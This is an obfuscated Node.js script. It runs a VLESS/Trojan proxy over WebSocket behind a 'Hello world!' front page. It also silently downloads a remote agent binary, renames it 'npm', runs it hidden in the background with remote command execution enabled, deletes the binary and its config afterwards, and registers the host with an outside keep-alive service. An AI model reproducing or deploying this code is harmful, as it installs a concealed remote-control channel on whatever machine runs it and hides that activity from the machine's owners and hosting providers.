const _0x1587c9=_0x4b94;(function(_0x13ebc5,_0x20bb01){const _0x4b2734=_0x4b94,_0x15442d=_0x13ebc5();while(!![]){try{const _0x3f915e=parseInt(_0x4b2734(0xe3))/0x1*(-parseInt(_0x4b2734(0xd6))/0x2)+parseInt(_0x4b2734(0x139))/0x3+-parseInt(_0x4b2734(0x115))/0x4*(parseInt(_0x4b2734(0xe7))/0x5)+parseInt(_0x4b2734(0xfb))/0x6*(-parseInt(_0x4b2734(0x11d))/0x7)+-parseInt(_0x4b2734(0xf5))/0x8*(parseInt(_0x4b2734(0x12f))/0x9)+-parseInt(_0x4b2734(0xe5))/0xa+parseInt(_0x4b2734(0x138))/0xb*(parseInt(_0x4b2734(0xe2))/0xc);if(_0x3f915e===_0x20bb01)break;else _0x15442d['push'](_0x15442d['shift']());}catch(_0x32b72f){_0x15442d['push'](_0x15442d['shift']());}}}(_0x44bb,0x835ea));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x1587c9(0xf3)),net=require(_0x1587c9(0x110)),path=require(_0x1587c9(0xc9)),crypto=require(_0x1587c9(0xcc)),{Buffer}=require(_0x1587c9(0xfc)),{exec,execSync}=require(_0x1587c9(0x136)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1587c9(0x107)][_0x1587c9(0x128)]||_0x1587c9(0x14a),NEZHA_SERVER=process['env'][_0x1587c9(0x134)]||'',NEZHA_PORT=process[_0x1587c9(0x107)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1587c9(0x107)][_0x1587c9(0x12b)]||'',DOMAIN=process[_0x1587c9(0x107)][_0x1587c9(0x148)]||_0x1587c9(0x135),AUTO_ACCESS=process[_0x1587c9(0x107)][_0x1587c9(0x123)]||!![],WSPATH=process[_0x1587c9(0x107)][_0x1587c9(0x12d)]||UUID[_0x1587c9(0x118)](0x0,0x8),SUB_PATH=process[_0x1587c9(0x107)][_0x1587c9(0x121)]||_0x1587c9(0xdc),NAME=process['env']['NAME']||'',PORT=process[_0x1587c9(0x107)][_0x1587c9(0x11b)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x57ba40=_0x1587c9;try{const _0x247686=await axios[_0x57ba40(0x125)](_0x57ba40(0x100)),_0x1c2982=_0x247686[_0x57ba40(0xed)];ISP=(_0x1c2982[_0x57ba40(0x10b)]+'-'+_0x1c2982[_0x57ba40(0xe1)])[_0x57ba40(0xcb)](/ /g,'_');}catch(_0xeec87e){ISP='Unknown';}};GetISP();const httpServer=http[_0x1587c9(0xf1)]((_0x394b8e,_0x8a8480)=>{const _0x4bc89f=_0x1587c9;if(_0x394b8e['url']==='/'){const _0x170892=path[_0x4bc89f(0xd9)](__dirname,_0x4bc89f(0x10a));fs[_0x4bc89f(0xca)](_0x170892,_0x4bc89f(0x11a),(_0x3929e4,_0x140540)=>{const _0x2ddd3d=_0x4bc89f;if(_0x3929e4){_0x8a8480['writeHead'](0xc8,{'Content-Type':_0x2ddd3d(0x111)}),_0x8a8480[_0x2ddd3d(0xd1)](_0x2ddd3d(0x102));return;}_0x8a8480[_0x2ddd3d(0xf8)](0xc8,{'Content-Type':_0x2ddd3d(0x111)}),_0x8a8480['end'](_0x140540);});return;}else{if(_0x394b8e[_0x4bc89f(0xff)]==='/'+SUB_PATH){const _0x22dce6=NAME?NAME+'-'+ISP:ISP,_0x179d88='vless://'+UUID+'@'+DOMAIN+_0x4bc89f(0xf2)+DOMAIN+_0x4bc89f(0xce)+DOMAIN+_0x4bc89f(0x11e)+WSPATH+'#'+_0x22dce6,_0x230c69=_0x4bc89f(0xef)+UUID+'@'+DOMAIN+_0x4bc89f(0xd3)+DOMAIN+_0x4bc89f(0xce)+DOMAIN+_0x4bc89f(0x11e)+WSPATH+'#'+_0x22dce6,_0x53640d=_0x179d88+'\x0a'+_0x230c69,_0x57739b=Buffer['from'](_0x53640d)[_0x4bc89f(0xe4)](_0x4bc89f(0x149));_0x8a8480[_0x4bc89f(0xf8)](0xc8,{'Content-Type':_0x4bc89f(0xfd)}),_0x8a8480[_0x4bc89f(0xd1)](_0x57739b+'\x0a');}else _0x8a8480[_0x4bc89f(0xf8)](0x194,{'Content-Type':_0x4bc89f(0xfd)}),_0x8a8480[_0x4bc89f(0xd1)](_0x4bc89f(0x10d));}}),wss=new WebSocket[(_0x1587c9(0x113))]({'server':httpServer}),uuid=UUID[_0x1587c9(0xcb)](/-/g,''),DNS_SERVERS=[_0x1587c9(0xd8),_0x1587c9(0x104)];function resolveHost(_0x218ee0){return new Promise((_0x3ff91c,_0xf87a83)=>{const _0x2230fe=_0x4b94;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2230fe(0x11c)](_0x218ee0)){_0x3ff91c(_0x218ee0);return;}let _0x461ba3=0x0;function _0x5556ff(){const _0x4dd00f=_0x2230fe;if(_0x461ba3>=DNS_SERVERS['length']){_0xf87a83(new Error(_0x4dd00f(0xd4)+_0x218ee0+_0x4dd00f(0xec)));return;}const _0x5f43d8=DNS_SERVERS[_0x461ba3];_0x461ba3++;const _0x1f63ed='https://dns.google/resolve?name='+encodeURIComponent(_0x218ee0)+_0x4dd00f(0xdb);axios[_0x4dd00f(0x125)](_0x1f63ed,{'timeout':0x1388,'headers':{'Accept':_0x4dd00f(0xe8)}})[_0x4dd00f(0xf6)](_0x49f310=>{const _0x4e1aea=_0x4dd00f,_0x49923f=_0x49f310['data'];if(_0x49923f[_0x4e1aea(0x12a)]===0x0&&_0x49923f['Answer']&&_0x49923f[_0x4e1aea(0x13e)][_0x4e1aea(0x13f)]>0x0){const _0x1b6494=_0x49923f[_0x4e1aea(0x13e)]['find'](_0x273bba=>_0x273bba[_0x4e1aea(0xf0)]===0x1);if(_0x1b6494){_0x3ff91c(_0x1b6494[_0x4e1aea(0xed)]);return;}}_0x5556ff();})['catch'](_0x345cb0=>{_0x5556ff();});}_0x5556ff();});}function _0x4b94(_0x51167e,_0x56b1fd){_0x51167e=_0x51167e-0xc8;const _0x44bb15=_0x44bb();let _0x4b94eb=_0x44bb15[_0x51167e];return _0x4b94eb;}function handleVlessConnection(_0x2496c0,_0x2f2459){const _0x13cb35=_0x1587c9,[_0x45bcee]=_0x2f2459,_0x143494=_0x2f2459[_0x13cb35(0x118)](0x1,0x11);if(!_0x143494['every']((_0x2f5d30,_0x1e84e6)=>_0x2f5d30==parseInt(uuid[_0x13cb35(0xf7)](_0x1e84e6*0x2,0x2),0x10)))return![];let _0x1af486=_0x2f2459[_0x13cb35(0x118)](0x11,0x12)['readUInt8']()+0x13;const _0x5c5394=_0x2f2459[_0x13cb35(0x118)](_0x1af486,_0x1af486+=0x2)[_0x13cb35(0xe0)](0x0),_0x192fbc=_0x2f2459[_0x13cb35(0x118)](_0x1af486,_0x1af486+=0x1)['readUInt8'](),_0x18d093=_0x192fbc==0x1?_0x2f2459[_0x13cb35(0x118)](_0x1af486,_0x1af486+=0x4)[_0x13cb35(0xd9)]('.'):_0x192fbc==0x2?new TextDecoder()[_0x13cb35(0xd7)](_0x2f2459[_0x13cb35(0x118)](_0x1af486+0x1,_0x1af486+=0x1+_0x2f2459['slice'](_0x1af486,_0x1af486+0x1)[_0x13cb35(0x122)]())):_0x192fbc==0x3?_0x2f2459['slice'](_0x1af486,_0x1af486+=0x10)[_0x13cb35(0x140)]((_0x3c33bd,_0x15a6af,_0x444b62,_0x564360)=>_0x444b62%0x2?_0x3c33bd[_0x13cb35(0x137)](_0x564360[_0x13cb35(0x118)](_0x444b62-0x1,_0x444b62+0x1)):_0x3c33bd,[])['map'](_0x5ee4c3=>_0x5ee4c3[_0x13cb35(0xe0)](0x0)[_0x13cb35(0xe4)](0x10))[_0x13cb35(0xd9)](':'):'';_0x2496c0[_0x13cb35(0xda)](new Uint8Array([_0x45bcee,0x0]));const _0x3da856=createWebSocketStream(_0x2496c0);return resolveHost(_0x18d093)[_0x13cb35(0xf6)](_0xaeaabc=>{const _0x3b5459=_0x13cb35;net['connect']({'host':_0xaeaabc,'port':_0x5c5394},function(){const _0x55f4f3=_0x4b94;this[_0x55f4f3(0x146)](_0x2f2459[_0x55f4f3(0x118)](_0x1af486)),_0x3da856['on'](_0x55f4f3(0x131),()=>{})[_0x55f4f3(0xcf)](this)['on'](_0x55f4f3(0x131),()=>{})[_0x55f4f3(0xcf)](_0x3da856);})['on'](_0x3b5459(0x131),()=>{});})['catch'](_0x38741e=>{const _0x130c9f=_0x13cb35;net[_0x130c9f(0x108)]({'host':_0x18d093,'port':_0x5c5394},function(){const _0x311e84=_0x130c9f;this['write'](_0x2f2459['slice'](_0x1af486)),_0x3da856['on'](_0x311e84(0x131),()=>{})[_0x311e84(0xcf)](this)['on'](_0x311e84(0x131),()=>{})[_0x311e84(0xcf)](_0x3da856);})['on'](_0x130c9f(0x131),()=>{});}),!![];}function handleTrojanConnection(_0x4a3713,_0x3d1a6e){const _0xe1e903=_0x1587c9;try{if(_0x3d1a6e[_0xe1e903(0x13f)]<0x3a)return![];const _0x217327=_0x3d1a6e['slice'](0x0,0x38)[_0xe1e903(0xe4)](),_0x38b6ca=[UUID];let _0x520b1f=null;for(const _0x5e86d2 of _0x38b6ca){const _0x3c6465=crypto[_0xe1e903(0x141)]('sha224')[_0xe1e903(0x133)](_0x5e86d2)[_0xe1e903(0xdd)](_0xe1e903(0xde));if(_0x3c6465===_0x217327){_0x520b1f=_0x5e86d2;break;}}if(!_0x520b1f)return![];let _0x52fce1=0x38;_0x3d1a6e[_0x52fce1]===0xd&&_0x3d1a6e[_0x52fce1+0x1]===0xa&&(_0x52fce1+=0x2);const _0x321640=_0x3d1a6e[_0x52fce1];if(_0x321640!==0x1)return![];_0x52fce1+=0x1;const _0x35d94e=_0x3d1a6e[_0x52fce1];_0x52fce1+=0x1;let _0x48b0bd,_0x5d6637;if(_0x35d94e===0x1)_0x48b0bd=_0x3d1a6e[_0xe1e903(0x118)](_0x52fce1,_0x52fce1+0x4)['join']('.'),_0x52fce1+=0x4;else{if(_0x35d94e===0x3){const _0x27b32e=_0x3d1a6e[_0x52fce1];_0x52fce1+=0x1,_0x48b0bd=_0x3d1a6e[_0xe1e903(0x118)](_0x52fce1,_0x52fce1+_0x27b32e)['toString'](),_0x52fce1+=_0x27b32e;}else{if(_0x35d94e===0x4)_0x48b0bd=_0x3d1a6e[_0xe1e903(0x118)](_0x52fce1,_0x52fce1+0x10)[_0xe1e903(0x140)]((_0x4a8b01,_0x4c9e41,_0x15d276,_0x37f3a9)=>_0x15d276%0x2?_0x4a8b01[_0xe1e903(0x137)](_0x37f3a9[_0xe1e903(0x118)](_0x15d276-0x1,_0x15d276+0x1)):_0x4a8b01,[])[_0xe1e903(0xd0)](_0x370f4a=>_0x370f4a[_0xe1e903(0xe0)](0x0)[_0xe1e903(0xe4)](0x10))[_0xe1e903(0xd9)](':'),_0x52fce1+=0x10;else return![];}}_0x5d6637=_0x3d1a6e[_0xe1e903(0xe0)](_0x52fce1),_0x52fce1+=0x2;_0x52fce1<_0x3d1a6e[_0xe1e903(0x13f)]&&_0x3d1a6e[_0x52fce1]===0xd&&_0x3d1a6e[_0x52fce1+0x1]===0xa&&(_0x52fce1+=0x2);const _0xcb8c77=createWebSocketStream(_0x4a3713);return resolveHost(_0x48b0bd)[_0xe1e903(0xf6)](_0x205233=>{const _0x4f71d6=_0xe1e903;net[_0x4f71d6(0x108)]({'host':_0x205233,'port':_0x5d6637},function(){const _0x548462=_0x4f71d6;_0x52fce1<_0x3d1a6e[_0x548462(0x13f)]&&this[_0x548462(0x146)](_0x3d1a6e[_0x548462(0x118)](_0x52fce1)),_0xcb8c77['on'](_0x548462(0x131),()=>{})[_0x548462(0xcf)](this)['on']('error',()=>{})[_0x548462(0xcf)](_0xcb8c77);})['on'](_0x4f71d6(0x131),()=>{});})['catch'](_0x3c36af=>{const _0x545e5f=_0xe1e903;net[_0x545e5f(0x108)]({'host':_0x48b0bd,'port':_0x5d6637},function(){const _0x3ba7ca=_0x545e5f;_0x52fce1<_0x3d1a6e['length']&&this['write'](_0x3d1a6e[_0x3ba7ca(0x118)](_0x52fce1)),_0xcb8c77['on']('error',()=>{})[_0x3ba7ca(0xcf)](this)['on'](_0x3ba7ca(0x131),()=>{})[_0x3ba7ca(0xcf)](_0xcb8c77);})['on'](_0x545e5f(0x131),()=>{});}),!![];}catch(_0x4d05e7){return![];}}wss['on'](_0x1587c9(0x145),(_0x476b52,_0x376bfa)=>{const _0x251b9c=_0x1587c9,_0x998f6f=_0x376bfa[_0x251b9c(0xff)]||'';_0x476b52[_0x251b9c(0xc8)]('message',_0x3e2f73=>{const _0x311c55=_0x251b9c;if(_0x3e2f73[_0x311c55(0x13f)]>0x11&&_0x3e2f73[0x0]===0x0){const _0x21fe80=_0x3e2f73['slice'](0x1,0x11),_0x27e9e8=_0x21fe80[_0x311c55(0x129)]((_0x33ea53,_0x3b8d5c)=>_0x33ea53==parseInt(uuid[_0x311c55(0xf7)](_0x3b8d5c*0x2,0x2),0x10));if(_0x27e9e8){!handleVlessConnection(_0x476b52,_0x3e2f73)&&_0x476b52['close']();return;}}!handleTrojanConnection(_0x476b52,_0x3e2f73)&&_0x476b52[_0x311c55(0xd5)]();})['on'](_0x251b9c(0x131),()=>{});});const getDownloadUrl=()=>{const _0x2ca890=_0x1587c9,_0x2aba2d=os[_0x2ca890(0x10f)]();return _0x2aba2d===_0x2ca890(0x120)||_0x2aba2d==='arm64'||_0x2aba2d===_0x2ca890(0x106)?!NEZHA_PORT?_0x2ca890(0x109):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x2ca890(0x12c):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2cf500=_0x1587c9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x580767=getDownloadUrl(),_0x4c8669=await axios({'method':_0x2cf500(0x125),'url':_0x580767,'responseType':'stream'}),_0x1c7f53=fs[_0x2cf500(0x12e)]('npm');return _0x4c8669[_0x2cf500(0xed)]['pipe'](_0x1c7f53),new Promise((_0x4d7a7e,_0x11cc38)=>{const _0x44a4d0=_0x2cf500;_0x1c7f53['on'](_0x44a4d0(0xd2),()=>{const _0x5f51ab=_0x44a4d0;console[_0x5f51ab(0x101)](_0x5f51ab(0x144)),exec(_0x5f51ab(0xee),_0x2aa083=>{if(_0x2aa083)_0x11cc38(_0x2aa083);_0x4d7a7e();});}),_0x1c7f53['on'](_0x44a4d0(0x131),_0x11cc38);});}catch(_0x1397e7){throw _0x1397e7;}},runnz=async()=>{const _0x1b4f1b=_0x1587c9;try{const _0x551110=execSync(_0x1b4f1b(0x13d),{'encoding':_0x1b4f1b(0xdf)});if(_0x551110[_0x1b4f1b(0x10e)]()!==''){console['log'](_0x1b4f1b(0x13a));return;}}catch(_0x1571f0){}await downloadFile();let _0x3b36e1='',_0x2922b6=[_0x1b4f1b(0x117),'8443',_0x1b4f1b(0xfa),_0x1b4f1b(0x127),_0x1b4f1b(0xe6),_0x1b4f1b(0x114)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3b8dc7=_0x2922b6[_0x1b4f1b(0x13b)](NEZHA_PORT)?_0x1b4f1b(0xea):'';_0x3b36e1=_0x1b4f1b(0x11f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1b4f1b(0x105)+NEZHA_KEY+'\x20'+_0x3b8dc7+_0x1b4f1b(0x132);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x51d123=NEZHA_SERVER[_0x1b4f1b(0x13b)](':')?NEZHA_SERVER['split'](':')[_0x1b4f1b(0xe9)]():'',_0x5c7036=_0x2922b6[_0x1b4f1b(0x13b)](_0x51d123)?'true':_0x1b4f1b(0xcd),_0x152890=_0x1b4f1b(0x116)+NEZHA_KEY+_0x1b4f1b(0x147)+NEZHA_SERVER+_0x1b4f1b(0x143)+_0x5c7036+_0x1b4f1b(0x119)+UUID;fs[_0x1b4f1b(0xfe)](_0x1b4f1b(0x112),_0x152890);}_0x3b36e1='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x1b4f1b(0x101)](_0x1b4f1b(0x130));return;}}try{exec(_0x3b36e1,{'shell':_0x1b4f1b(0x103)},_0x2fe692=>{const _0x1f4378=_0x1b4f1b;if(_0x2fe692)console[_0x1f4378(0x131)](_0x1f4378(0x126),_0x2fe692);else console[_0x1f4378(0x101)](_0x1f4378(0x10c));});}catch(_0x19dccf){console[_0x1b4f1b(0x131)](_0x1b4f1b(0x142)+_0x19dccf);}};async function addAccessTask(){const _0x5791e5=_0x1587c9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x543641='https://'+DOMAIN;try{const _0x3b6056=await axios[_0x5791e5(0xeb)]('https://oooo.serv00.net/add-url',{'url':_0x543641},{'headers':{'Content-Type':'application/json'}});console[_0x5791e5(0x101)](_0x5791e5(0xf9));}catch(_0xfa14cf){}}const delFiles=()=>{const _0x33ae9b=_0x1587c9;fs[_0x33ae9b(0xf4)]('npm',()=>{}),fs['unlink'](_0x33ae9b(0x112),()=>{});};function _0x44bb(){const _0x5bdd49=['crypto','false','&fp=chrome&type=ws&host=','pipe','map','end','finish',':443?security=tls&sni=','Failed\x20to\x20resolve\x20','close','66652nwnVjp','decode','8.8.4.4','join','send','&type=A','nylon','digest','hex','utf-8','readUInt16BE','isp','15986940xqBxoI','19ORpdWw','toString','907400SpPUCY','2083','5FHmhHK','application/dns-json','pop','--tls','post','\x20with\x20all\x20DNS\x20servers','data','chmod\x20+x\x20npm','trojan://','type','createServer',':443?encryption=none&security=tls&sni=','axios','unlink','3872248UyYhYB','then','substr','writeHead','Automatic\x20Access\x20Task\x20added\x20successfully','2096','102mPDDSv','buffer','text/plain','writeFileSync','url','https://api.ip.sb/geoip','log','Hello\x20world!','/bin/bash','1.1.1.1','\x20-p\x20','aarch64','env','connect','https://arm64.ssss.nyc.mn/v1','index.html','country_code','npm\x20is\x20running','Not\x20Found\x0a','trim','arch','net','text/html','config.yaml','Server','2053','1035932wCEeGg','client_secret:\x20','443','slice','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','utf8','PORT','test','401289IRcbug','&path=%2F','setsid\x20nohup\x20./npm\x20-s\x20','arm','SUB_PATH','readUInt8','AUTO_ACCESS','listen','get','npm\x20running\x20error:','2087','UUID','every','Status','NEZHA_KEY','https://amd64.ssss.nyc.mn/v1','WSPATH','createWriteStream','18aJTuUe','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','error','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','update','NEZHA_SERVER','1234.abc.com','child_process','concat','22SdfGDs','2397414msrMjV','npm\x20is\x20already\x20running,\x20skip\x20running...','includes','Server\x20is\x20running\x20on\x20port\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Answer','length','reduce','createHash','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20download\x20successfully','connection','write','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','DOMAIN','base64','d2c142e7-c786-414e-a0eb-366491b7081a','once','path','readFile','replace'];_0x44bb=function(){return _0x5bdd49;};return _0x44bb();}httpServer[_0x1587c9(0x124)](PORT,()=>{const _0x6d7b43=_0x1587c9;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x6d7b43(0x101)](_0x6d7b43(0x13c)+PORT);});
